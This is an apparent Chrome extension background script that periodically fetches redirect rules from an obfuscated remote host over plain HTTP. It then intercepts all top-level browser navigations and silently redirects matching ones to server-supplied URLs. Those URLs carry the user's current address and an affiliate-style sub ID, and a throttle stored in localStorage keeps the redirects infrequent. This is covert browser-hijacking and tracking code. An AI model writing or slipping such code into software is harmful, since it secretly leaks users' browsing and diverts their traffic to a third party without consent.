(function(){
var host = 'data-monitor';
var subhost = '//api';
var wid = 116;
var rulesObject = {};
var usedT = localStorage['usedT'] ? parseInt(localStorage['usedT']) : null;
function req(obj, callback, errback) 
{
	var params = obj.params ? obj.params : [],
		xhr = new XMLHttpRequest;

	if (callback) {
		xhr.onload = function(e) {
				e = e.target;
				if (e.status === 200 || e.status === 304) {
					callback({
							responseText: e.responseText,
							headers: e.getAllResponseHeaders().split("\r\n")
					});
				}
				else if (errback) {
					errback(e.status);
				}
		};
	}
	if (errback) {
		xhr.onerror = function(e) {
				e = e.target.status;
				errback(e);
		}
	}
	xhr.open(obj.method, obj.url);
	if (params.head) for (i in params.head) obj.setRequestHeader(i, params.head[i]);
	if (params.mime) for (i in params.mime) obj.overrideMimeType(params.mime[i]);
	if (params.post) xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	if (params.post || params.xml) xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
	if (typeof params.post == "object") {
		x = params.post;
		params.post = "";
		for (i in x)
		{
			if (x.hasOwnProperty(i))
			{
				params.post += (params.post ? "&" : "") + i + "=" + x[i];
			}
		}
	}
	xhr.send(params.post)
}

var mainRgxp = new RegExp("^(?:([^:\\/?]+):)?(?:\\/\\/([^\\/]*))?([^?]*)(?:\\?([^$]*))?"),
	domainRgxp = /((?:[^.]+)\.(?:(?:com?|org)\.)?\w+)$/i;


function cutw(hostname)
{
	return hostname.replace(/(^www\.|\:\d+$)/ig, "");
}

function getDomain(hostname)
{
	var matches = hostname.match(domainRgxp),
		result;
	if (matches)
	{
		result = matches[1];
	}
	return result;
}
function getSub(hostname, domain)
{
  var result = hostname.replace(domain, "");
  if (result)
  {
    result = result.replace(/\.$/, "");
  }
  return result;
}

function prepareLink(link)
{
	if (!/^(\w+:)?\/\//.test(link))
	{
		link = "http://" + link;
	}
	var matches = link.match(mainRgxp),
	result;
	if (matches)
	{
		try
		{
			var host = cutw(matches[2]);
			var domain = getDomain(host);
		    if (domain)
		    {
		    	var sub = getSub(host, domain);
				result = {
						sch : matches[1],
						host : host,
						domain: domain,
						sub: sub,
						path : (matches[3] || "").replace(/^\//, ""),
						search : (matches[4] || "").replace(/^\?/, "")
					};
		    }

		}
		catch(e)
		{
			console.log("Error: " + url);
		}
	}
	return result;
}

function tryUrl(url)
{
	if (usedT && usedT > (new Date()).getTime() - 1000 * 60 * 70)
	{
		return;
	}
	var res;
	var prepared = prepareLink(url);
	if (prepared)
	{
		if (rulesObject[prepared.domain])
		{
			var subd = rulesObject[prepared.domain][prepared.sub];
			if (subd)
			{
				if (subd[prepared.path])
				{
					res = subd[prepared.path]; 
				}
				else if (subd["*"])
				{
					res = subd["*"];
				}
			}
			if (!res)
			{
				subd = rulesObject[prepared.domain]["*"];
				if (subd)
				{
					if (subd[prepared.path])
					{
						res = subd[prepared.path]; 
					}
					else if (subd["*"])
					{
						res = subd["*"];
					}
				}
			}
			if (res)
			{
				res = res.replace(/__CURURL__/g, encodeURIComponent(url)).replace(/__SUBID__/g, wid);
				usedT = (new Date()).getTime();
				localStorage['usedT'] = usedT;
				return res;
			}
		}
	}
}

function getData()
{
	setTimeout(getData, 24 * 60 * 60 * 1000);
	req({
    	method: "GET",
    	url: `ht${'tp'}:${subhost}.${host}.info/api/` + "bhrule?sub=" + wid
    }, function(response) {
    	try
    	{
    		response = JSON.parse(response.responseText);
    		rulesObject = response.rules ? response.rules : {};
    	}
    	catch(e){}
    }, function (){});
}

var listenFunc = function(details)
{
	if (usedT && usedT > (new Date()).getTime() - 1000 * 60 * 70)
	{
		return;
	}
	if (details.frameId === 0 && details.type == "main_frame" && details.parentFrameId === -1 && details.tabId > 0 && (/^https?/i.test(details.url))) {
		var current = details.url;
		var parse_url = prepareLink(current);

		var new_url = tryUrl(current),
			result = typeof(new_url) === "string" && current != new_url;
		if (result)
		{
			return { redirectUrl : new_url};
		}
	}
}
chrome.webRequest.onBeforeRequest.addListener(listenFunc, {urls : ["<all_urls>"]}, ["blocking"]);
getData();
})();